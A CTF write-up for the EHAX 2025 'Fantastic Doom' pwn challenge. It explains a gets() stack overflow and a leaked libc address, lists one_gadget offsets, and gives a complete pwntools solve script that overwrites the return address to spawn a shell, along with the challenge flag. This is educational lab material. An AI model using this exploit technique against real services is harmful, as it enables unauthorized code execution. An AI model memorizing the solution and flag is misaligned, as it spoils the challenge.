---
ctf: EHAX
title: Fantastic Doom
authors:
    - name: nrg
      url: https://app.intigriti.com/profile/nrg
    - name: the_moon_guy
      url: https://github.com/mayank-jangid-moon
description: Doctor Doom, the monarch of Latveria has made many doombots. You working with the Fantastic 4 have to access doombot machine and foil his plans of releasing doombots.
categories:
    - Pwn
difficulty: Medium
ctf_year: 2025
challengefiles: fantasticdoom
published: "2025-04-24"
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** This is a pretty easy pwn challenge allowing the user to input an auth code once.
    **- Key Discoveries:** There is a free libc leak and a stack buffer overflow.
    **- Exploitation:** Due to the leak we can defeat ASLR and by exploiting the overflow as an attacker we can control the return address.

# 1. Introduction<a id="introduction"></a>

By starting the binary we are greeted with some random stuff and an input for some kind of auth code:

![cli-overview](ctf/writeups/ehax/fantasticdoom/cli.png "cli-overview")

At first it seems like we need to reveal the code.

# 2. Reconnaissance<a id="reconnaissance"></a>

At first we need to know the enabled protections:

![checksec](ctf/writeups/ehax/fantasticdoom/checksec.png "checksec")

Interesting enough there are no stack canaries and more over `PIE` is inactive. But we should still assume that `ASLR` is activated as it is not an option of the binary itself but of the operating system. Most of the operating system have `ASLR` enabled by default. Analysing the binary in `Binary Ninja` we discover something interesting:

![binja-overview](ctf/writeups/ehax/fantasticdoom/binja.png "binja-overview")

This binary got a very obvious stack buffer overflow by using the `gets` functionality which just reads the whole user input until it reaches a `\n` and saves it the given buffer. The main problem about `gets` is, the buffer to which the user input is copied got limited size, while the user input got unknown size. More over as we can see in the decompiled code, we get a free leak of the address of the libc function `wctrans`.

# 3. Vulnerability Description<a id="vulnerability description"></a>

The usage of `gets` leads to an arbitrary large stack buffer overflow and by leaking the address of `wctrans` we can easily defeat `ASLR` - at least for everything libc related. Unfortunately the `NX` protection is enabled, so we can't just return to the stack buffer and injecting some shell code.

# 4. Exploitation<a id="exploitation"></a>

Only knowing the randomized libc base address is already enough to get a shell, as we can just pop a shell via a [OneGadget](https://github.com/david942j/one_gadget). This tool is absolutely great. By executing it like `one_gadget libc.so.6` we get the offsets of potentially useful onegadgets which can be exploited to pop a shell without any ROP:

```bash
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

As these onegadgets got some requirements to work, we can easily just try out everyone of these. The one with libc offset `0x4f2a5` will work for us. After determining the offset to the return address e.g. by using the `cyclic` command in `gdb` we can construct our payload and eventually pop our shell.

# 5. Mitigation<a id="mitigation"></a>

The vulnerabilities can be easily mitigated by not intentionally leaking some addresses and moreover using some safe alternatives for `gets` like `fgets`.

# 6. Solve Script<a id="solve script"></a>

```python
#!/usr/bin/env python3
from string import Template
import glob
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'debug'

# must be dict
ENV_VARS = None

gdbscript = """
# breakrva 0x1ab5
break *gets
continue
"""


def main():
    io = start_conn()

    libc_leak_offset = 0x1255E0
    io.recvuntil("0x7")
    leak = b'7' + io.recvuntil("0x")[:-2]
    libc_base = int(leak, 16) - libc_leak_offset
    print(f'[*] Leaked libc base: {hex(libc_base)}')
    validate_leaked_addresses(io, libc_base=libc_base)

    one_gadget_offset = 0x4f29e
    one_gadget_offset = 0x4f2a5
    # one_gadget_offset = 0x4f302
    # one_gadget_offset = 0x10a2fc

    one_gadget = libc_base + one_gadget_offset

    ret_offset = 168
    io.sendlineafter("Enter authcode: ", b"A" * ret_offset + p64(one_gadget))

    io.interactive()
    clean_up()







### Helper start

def start_conn():
    if args.REMOTE:
        log.info(Template('Starting with remote connection to $HOST on port $PORT...').substitute(HOST=sys.argv[1], PORT=sys.argv[2]))
        io = remote(sys.argv[1], sys.argv[2])
    else:
        log.info('Starting locally...')
        io = process([exe.path], env=ENV_VARS)
        if args.GDB:
            log.info('Starting with GDB...')
            gdb.attach(io, gdbscript=gdbscript, exe=exe.path)
    return io


def get_string_between(res, first_const_str, second_const_str):
    return res.split(first_const_str)[1].split(second_const_str)[0]


def get_mapping_offset(proc_mapping, search_for):
    heap_offset = 0
    for i, mapping in enumerate(proc_mapping):
        if search_for in mapping:
            heap_offset = i
            break
    return heap_offset


def validate_leaked_addr(proc_mapping, offset, given_addr, addr_name):
    true_base = int(proc_mapping[offset].split('-')[0], 16)
    if int(given_addr) != true_base:
        log.critical(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR is not the correct $ADDR_NAME like $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))
    else:
        log.info(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR equals correct $ADDR_NAME $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))


def validate_leaked_addresses(io, bin_base=None, heap_base=None, libc_base=None, stack_base=None):
    if args.REMOTE:
        log.warning('Skipping leaked address validation because not running locally...')
        return

    with open(Template('/proc/$PROC_ID/maps').substitute(PROC_ID=io.proc.pid)) as f:
        proc_mapping = f.readlines()
    if bin_base:
        bin_path_split = exe.path.split('/')
        bin_path = bin_path_split[len(bin_path_split) - 1]
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, bin_path), bin_base, 'bin base')
    if heap_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'heap'), heap_base, 'heap base')
    if libc_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'libc'), libc_base, 'libc base')
    if stack_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'stack'), stack_base, 'stack base')

    if not any([bin_base, heap_base, libc_base, stack_base]):
        log.warning('Skipping leaked address validation because no leaked addresses were given...')


def clean_up():
    # remove corefiles (memory dumps) being generated due to program crashes
    for corefile in glob.glob('core*'):
        os.remove(corefile)

### Helper end


if __name__ == "__main__":
    main()

```

# 7. Flag<a id="flag"></a>

EH4X{st4n_l33_c4m30_m1ss1ng_dOOoOoOoOoOOm}

# 8. References<a id="references"></a>

- [OneGadget](https://github.com/david942j/one_gadget)
